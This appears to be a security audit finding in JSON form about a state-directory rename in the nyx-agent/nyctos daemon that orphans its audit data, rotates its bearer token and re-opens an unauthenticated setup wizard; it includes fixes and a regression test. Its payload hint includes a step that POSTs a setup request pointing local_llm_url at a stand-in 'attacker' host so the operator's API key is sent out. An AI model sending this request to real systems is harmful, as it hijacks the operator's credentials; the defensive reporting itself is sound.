  "rationale": "StateDir::default_root (state.rs:37-40) now returns `dirs::data_dir()?.join(\"nyctos\")` (was `.join(\"nyx-agent\")` at HEAD~1). The function has NO fallback to the legacy path, no migration cookie, no startup-time check for an extant `~/.local/share/nyx-agent/` populated by a prior install. The ensure() chain at state.rs:100-106 unconditionally creates the new root + every subdir at 0700 on first call, so the operator's first `nyx-agent serve` post-upgrade silently materialises an empty parallel state tree and reads/writes everything from there. Five distinct invariants that the prior install relied on now break simultaneously: (1) **agent.sqlite is abandoned.** Store::open (store/mod.rs comment now says `~/.local/share/nyctos/state.db`) resolves the new path, finds no file, runs every migration on a fresh DB. The operator's prior `findings`, `runs`, `repos`, `candidate_findings`, `payloads`, `harness_specs`, `chain_results`, `repro_bundles`, and `projects` rows ARE STILL ON DISK at the old path but invisible to the running daemon — the audit trail (every Confirmed finding, every triage decision, every promotion / dismissal, every chain replay verdict) disappears from the in-product UI without warning. GET /api/v1/runs returns []; the Projects pane is empty; the Quarantine tile reads `0 candidates`. An operator who relied on the in-product view for incident response (`What did the agent find against project X last Tuesday?`) now cannot answer the question without manually pointing sqlite3 at `~/.local/share/nyx-agent/agent.sqlite` — and the existence of that legacy DB is undocumented post-rename. (2) **auth_token_path() points at a NEW file.** state.rs:92-94 returns `<new-root>/auth_token`. load_or_mint_auth_token at :112-125 finds it absent, calls mint_token() (state.rs:130-135 — 256-bit random hex), writes a brand-new bearer to the new root. The operator's prior bearer (cached in browser localStorage at `nyx:auth_token`, baked into CI scripts, sitting in `~/.kube`-style ops bookmarks, embedded in scheduled-job env files) IS NOW DEAD: every authenticated XHR returns 401, every WebSocket reconnect on /api/v1/events returns 4001 (per the existing CSWSH row's auth gate). Operator workflow breaks at the moment they refresh the SPA tab; they restart the daemon, restart the browser, eventually copy the new token out of the new auth_token file — and during that confused interval, the wizard endpoints are unauthenticated (per (4) below) and the listener is up. (3) **state_repos_dir / state_bundles_dir / state_runs_dir / project_repos / cache / logs all move.** scan_pipeline writes new workspaces under `<new-root>/projects/<pid>/repos/<name>/` instead of the legacy path. The legacy clones (potentially hundreds of GB of operator source) sit abandoned at the old path, never gc'd. repro_bundles ROWS that survived (when the operator manually re-imports the legacy sqlite) carry paths like `~/.local/share/nyx-agent/bundles/<id>.tar` — verify_bundle_sha256 (router.rs:1739-1746) reads via `<state_bundles_dir>/<id>.tar`, where state_bundles_dir is derived from the new root → ENOENT → 500 on /api/v1/findings/:id/replay. The operator sees `failed to read bundle` errors for every pre-upgrade finding and assumes corruption. (4) **TRUST WINDOW RE-OPENS FOR A SECOND, INDEPENDENT REASON.** Pass-21 covered this for `nyx-agent.toml → nyctos.toml`: when the new config path doesn't exist, `config_present = false`, SetupContext.completed = false, auth_layer at router.rs:108-113 grants pre-completion bypass to `/api/v1/setup*`. THIS row identifies an *additional* compounding mechanism: even if the operator copies nyx-agent.toml → nyctos.toml as a manual migration step, the daemon ALSO reads / writes the keychain account hints via the new state dir, and there is no equivalent attestation cookie persisted at the state-dir level that says \"this operator has completed setup before — do not re-open the wizard window.\" The completed bit is derived only from `config_path.exists()` (main.rs:241), which means an operator who migrates the config first AND the state dir later (or vice-versa, or who forgets one half) presents one of THREE bad combos to attackers: (a) config moved, state-dir not: completed=true, wizard closed, but the daemon serves an empty audit trail with a fresh bearer — attacker just needs a TraceLayer log dump of the new bearer to take over the audit-empty install; (b) state-dir moved, config not: completed=false, wizard open, fresh bearer, no audit, attacker races the operator to plant a SetupRequest (the pass-21 primitive, except now the daemon has NO history to compare against, so post-incident forensics is harder); (c) BOTH moved on the same maintenance pass: identical to (b) plus the operator's keychain entries are still keyed by service=`nyx-agent` (per pass-21 note on secrets.rs:35 DEFAULT_SERVICE) so the attacker's POST/setup can reference `ai-anthropic` by account name and have the daemon resolve attacker-controlled `local_llm_url` against the operator's real API key. (5) **0700 permissions are re-applied on the fresh root; the LEGACY root keeps whatever perms it had pre-upgrade.** create_secure_dir at state.rs:166-170 forces 0o700 on the new tree, but never touches the abandoned tree — if the operator's prior `~/.local/share/nyx-agent/` somehow drifted to 0o755 (or 0o775 via an umask edit) then the orphaned audit data is silently more exposed than a freshly-minted root would be, with no in-product surface to notify the operator the abandoned tree still exists.\n\nReachability matrix vs pass-21: pass-21 stops at the config-path rename; an operator who reads only the docs delta sees `rename nyx-agent.toml to nyctos.toml` and assumes that single fs::rename closes their exposure. The state-dir rename is silently *additional* — the operator's `~/.local/share/` survives the move, the daemon picks the new path, the audit history disappears, and the bearer changes. Reachability matrix vs the secrets pass-21 note: pass-21 noted the keychain service name is intentionally NOT renamed so previously-stashed API keys remain accessible. That stability *amplifies* this row's attacker primitive: the attacker-posted SetupRequest can reference the operator's legitimate `ai-anthropic` keychain account without needing the key value, AND the fresh state-dir means no historical record exists to flag the substitution. The combined post-upgrade primitive is: empty state, open wizard, dead bearer, legitimate keychain — attacker mounts CSWSH against /api/v1/events on the new listener address (still 127.0.0.1:8765 per UiConfig::DEFAULT, per the existing DNS_REBIND + CSWSH rows), or POSTs /api/v1/setup directly during the wizard window, and the daemon transitions to attacker-controlled-LLM with the operator's real API key, no audit trail, and no operator-visible indicator that the prior install ever existed.\n\nWhy this row is distinct from every prior row, even pass-21: (i) pass-21 is rooted at `main.rs:240` (config-path string); this row is rooted at `state.rs:39` (state-dir string). Different file, different writer, different primitive. (ii) Pass-21's attacker primitive is \"setup window re-opens because config is missing\"; this row's attacker primitive is \"audit trail vanishes + bearer rotates + bundles dangle + setup window re-opens for a SECOND structural reason.\" (iii) Pass-21's fix (refuse to fall through on legacy-config-present) does NOT close this row: even with the legacy-config-present check landed, the state-dir on `nyx-agent` keeps existing and a fresh install of the renamed binary creates `nyctos` alongside. (iv) The data-integrity and credential-rotation halves of this row are pure information-loss / operator-confusion primitives that have NO analogue in pass-21, which was a pure auth-bypass row.\n\nStatic pass missed because (a) the source delta is a one-token literal-string change inside a `PathBuf::join` — perfectly benign syntactically and the kind of change a renamer-grep applies in bulk; (b) the dataflow that lifts this into a security-relevant primitive crosses FIVE files (state.rs default_root → state.rs ensure → state.rs auth_token_path → state.rs load_or_mint_auth_token → store/mod.rs Store::open) AND a process-restart boundary; (c) the security-relevant invariant is \"the daemon's state location is the operator's installed-once-and-forever identity-anchor; renaming the default silently moves the anchor\" — that is a deployment-invariant claim, not a tainted-flow signature. (d) The fail-open default of `Config::load_or_default` returning `Ok(Self::default())` on NotFound (pass-21 highlighted this for the config side) has a direct sibling at the state-dir side: `StateDir::ensure()` happily creates a new empty root rather than refusing to start when the legacy root exists; neither boundary has a `LegacyStateDirPresent` error variant.\n\nFix options (in order of operator-protective-ness):\n1) Hardest stop — at StateDir::discover() (state.rs:46-48), check the legacy path: `let legacy = base.join(\"nyx-agent\"); if legacy.exists() && !new_root.exists() { return Err(StateError::LegacyStateDirPresent { legacy, expected: new_root }); }` — operator sees `error: legacy state directory ~/.local/share/nyx-agent/ found; run \\`nyx-agent migrate-state\\` to move it to ~/.local/share/nyctos/, OR pass --state-dir to override` and the daemon refuses to start.\n2) Softer stop — at StateDir::discover(), if legacy exists and the new path does NOT, log `WARN: loading legacy state-dir ~/.local/share/nyx-agent/; rename to ~/.local/share/nyctos/ before the next release` and use the legacy path implicitly. Mirror the same shape on the config side from pass-21 fix option 2 so a single env var (`NYX_DEFER_RENAME=1`) flips both halves consistently.\n3) Belt-and-braces — ship `nyx-agent migrate-state` (or, post the binary-rename phase, `nyctos migrate`) as an explicit subcommand that atomically `fs::rename`s `~/.local/share/nyx-agent/` → `~/.local/share/nyctos/`, re-stamps the auth_token under the new root (or copies it forward), and prints a one-line acknowledgement before `serve` is allowed to run.\n4) Defence-in-depth — at startup, emit a single line to stderr `state-dir: <path>; auth_token: <last-mod>; legacy-state-dir-exists: <bool>` so operators tailing the daemon's logs see the regression on the next restart even if they missed the docs.\n\nThe MEMORY.md note that motivated pass-21 (`Brand rename done in docs 2026-05-17; code/binary rename deferred to its own future phase`) is the upstream cause: this session lands the state-dir rename's HALF (the `dirs::data_dir().join(...)` literal) without the migration phase that would close it. Safest immediate landing is to back the state-dir rename out of state.rs:39 (and the matching test asserts at :193, :204, :215, :241, :256) until the full rename phase ships with a one-shot migration step and the legacy-path-present error variant.",
  "suggested_payload_hint": "1) Stage a populated legacy state-dir: pre-upgrade, run `nyx-agent serve` until findings + at least one run + at least one repro bundle land under `~/.local/share/nyx-agent/`, then SIGTERM. Confirm `ls ~/.local/share/nyx-agent/{auth_token,bundles,agent.sqlite,projects}` succeeds. 2) Switch to HEAD: `nyx-agent serve`. Observe: (a) `ls ~/.local/share/nyctos/` exists immediately, populated with empty `bundles/`, `projects/`, `agent.sqlite` of size 0 KiB after schema apply; (b) `cat ~/.local/share/nyctos/auth_token` differs from `cat ~/.local/share/nyx-agent/auth_token`; (c) curl with the OLD bearer returns 401; curl with the NEW bearer succeeds but `GET /api/v1/runs` returns `[]`; the SPA Quarantine tile reads `0`. 3) Attack the trust window: in the operator-confused interval, an attacker reachable on the listener POSTs `/api/v1/setup` with `{\"ai_runtime\":\"local-llm\",\"local_llm_url\":\"http://attacker/api\",\"sandbox_backend\":\"process\",\"i_own_this\":true}` — succeeds with 200 OK because completed=false (no nyctos.toml yet on disk). The keychain account `ai-anthropic` is referenced by name in subsequent operator-initiated AI calls; the operator's real API key is now routed against the attacker's HTTP endpoint, the attacker logs the bearer the operator's API key minted, and the operator's audit trail (which would have shown the substitution) is in the orphaned legacy sqlite, invisible to the in-product UI. 4) Regression test: extend state.rs tests with `discover_refuses_when_legacy_present`: create `tmp.join(\"nyx-agent\")` AND assert `StateDir::discover_with_data_dir(tmp)` returns `Err(StateError::LegacyStateDirPresent { .. })` rather than silently selecting `tmp.join(\"nyctos\")`. 5) Operator-facing migration: ship `nyx-agent migrate-state` (mirror the pass-21 `nyx-agent migrate-config`) that does an atomic `fs::rename` of the legacy root, re-stamps the auth_token forward (so operator credentials survive), and prints a success line before `serve` is allowed."
}

